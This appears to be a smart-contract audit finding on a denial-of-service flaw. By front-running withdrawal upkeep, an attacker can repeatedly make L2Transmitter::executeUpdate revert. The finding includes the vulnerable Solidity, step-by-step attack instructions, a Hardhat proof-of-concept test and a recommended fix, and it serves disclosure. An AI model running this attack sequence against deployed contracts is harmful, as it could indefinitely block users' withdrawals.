## Details
The protocol's `L2Transmitter::executeUpdate` function can be blocked through manipulation of withdrawal timing controls. The vulnerability exists due to a lack of access control on `WithdrawalPool::performUpkeep` combined with shared timing restrictions between withdrawals and L2 transmitter updates.

The key issue stems from the interaction between these functions:
```solidity
// L2Transmitter.sol
function executeQueuedWithdrawals() public {
        uint256 queuedTokens = l2Strategy.getTotalQueuedTokens();
        uint256 queuedWithdrawals = withdrawalPool.getTotalQueuedWithdrawals();
        uint256 toWithdraw = MathUpgradeable.min(queuedTokens, queuedWithdrawals);

        if (toWithdraw == 0) revert CannotExecuteWithdrawals();

        bytes[] memory args = new bytes[](1);
        args[0] = "0x";
        withdrawalPool.performUpkeep(abi.encode(args)); //@audit attacker can front-run this to block execute update
    }

function executeUpdate() external payable {
    if (block.timestamp < timeOfLastUpdate + minTimeBetweenUpdates) { //@audit can only run this once every minTimeBetweenUpdates
        revert InsufficientTimeElapsed();
    }

    if (queuedTokens != 0 && queuedWithdrawals != 0) {
        executeQueuedWithdrawals();  // This calls WithdrawalPool.performUpkeep()
        queuedTokens = l2Strategy.getTotalQueuedTokens();
        queuedWithdrawals = withdrawalPool.getTotalQueuedWithdrawals();
    }
    // ... CCIP processing ...
}
```

In WithdrawalPool.sol:
```solidity
function performUpkeep(bytes calldata _performData) external {
    uint256 canWithdraw = priorityPool.canWithdraw(address(this), 0);
    uint256 totalQueued = _getStakeByShares(totalQueuedShareWithdrawals);
    if (
        totalQueued == 0 ||
        canWithdraw == 0 ||
        block.timestamp <= timeOfLastWithdrawal + minTimeBetweenWithdrawals
    ) revert NoUpkeepNeeded();

    timeOfLastWithdrawal = uint64(block.timestamp);
    // ... withdrawal processing ...
}
```

An attacker can block `L2Transmitter::executeUpdate` by doing the following:

Wait for `minTimeBetweenWithdrawals` to elapse
Call `L2Transmitter::executeQueuedWithdrawals()` right after time elapses
If `queuedWithdrawals` becomes 0: Queue a minimum withdrawal to restore `queuedWithdrawals > 0`

Eventually when `L2Transmitter::executeUpdate` is called, it will try to process withdrawals via `executeQueuedWithdrawals` since `queuedTokens` and `queuedWithdrawals` are both non-zero. This fails because `minTimeBetweenWithdrawals` has not elapsed causing the entire `executeUpdate` to revert.

This attack can be repeated to continuously prevent CCIP updates from being processed. This can potentially prevent withdrawals on L1 indefinitely.

## Proof of Concept
Run the following POC, with `minTimeBetweenWithdrawals` for withdrawal pool as 50,000 and `minTimeBetweenUpdates` for L2Transmitter as 86400. Also, set `allowInstantWithdrawals` to false in PriorityPool.

```solidity
  it('DOS executeUpdate on L1Transmitter', async () => {
    const {
      signers,
      accounts,
      l2Strategy,
      l2Metistoken,
      l2Transmitter,
      stakingPool,
      priorityPool,
      withdrawalPool,
      offRamp,
    } = await loadFixture(deployFixture)

    // // setup Bob and Alice
    const bob = signers[7]
    const bobAddress = accounts[7]
    const alice = signers[8]
    const aliceAddress = accounts[8]

    // 1.0 Fund Alice and Bob token and give necessary approvals
    await l2Metistoken.transfer(bobAddress, toEther(100))
    await l2Metistoken.connect(bob).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(bob).approve(priorityPool.target, ethers.MaxUint256)

    await l2Metistoken.transfer(aliceAddress, toEther(100))
    await l2Metistoken.connect(alice).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(alice).approve(priorityPool.target, ethers.MaxUint256)

    // 2.0 Bob deposits 50 METIS and calls executeUpdate on L2Transmitter
    await priorityPool.connect(bob).deposit(toEther(50), false, ['0x'])
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 50)

    await l2Transmitter.executeUpdate({ value: toEther(10) })

    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 50)

    // 3.0 Assume tokens are invested in sequencer vaults on L1 and a message is returned
    await offRamp
      .connect(signers[5]) //@note executes message on L2
      .executeSingleMessage(
        ethers.encodeBytes32String('messageId'),
        777,
        ethers.AbiCoder.defaultAbiCoder().encode(
          ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
          [toEther(50), 0, toEther(50), [], []]
        ),
        l2Transmitter.target,
        []
      )
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 0)
    assert.equal(fromEther(await l2Strategy.tokensInTransitFromL1()), 0)
    assert.equal(fromEther(await l2Strategy.l1TotalDeposits()), 50)

    // 4.0 At this point Alice deposits 25 metis
    await priorityPool.connect(alice).deposit(toEther(25), false, ['0x'])

    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 75)
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 25)
    assert.equal(fromEther(await l2Metistoken.balanceOf(l2Strategy.target)), 25)

    // 5.0 Right before executeUpdate is called on L2Transmitter, Bob withdraws 10 metis
    await priorityPool.connect(bob).withdraw(
      toEther(10),
      0,
      0,
      [],
      false,
      true, // queue withdrawal
      ['0x']
    )

    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 10)

    // 6.0 Bob then calls executeQueuedWithdrawals
    await time.increase(50001) // 50000 seconds is min time between withdrawals
    await l2Transmitter.executeQueuedWithdrawals()

    // At this point queued withdrawals is 5, queued tokens is 0
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 15)
    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 0)

    // // 7.0 Bob again places a 10 metis withdrawal
    await priorityPool.connect(bob).withdraw(
      toEther(10),
      0,
      0,
      [],
      false,
      true, // queue withdrawal
      ['0x']
    )
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 15)
    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 10)

    await time.increase(36401) // 50001 + 36401 > 86400. So from the initial time, we are now 86401 seconds
    // we should be able to again run execute update

    await expect(l2Transmitter.executeUpdate({ value: toEther(10) })).to.be.revertedWithCustomError(
      withdrawalPool,
      'NoUpkeepNeeded'
    )
  })
```

## Recommendation
In `L2Transmitter::executeQueuedWithdrawals`, consider calling `WithdrawalPool::performUpkeep` only when `WithdrawalPool::checkUpkeep` is `true`.
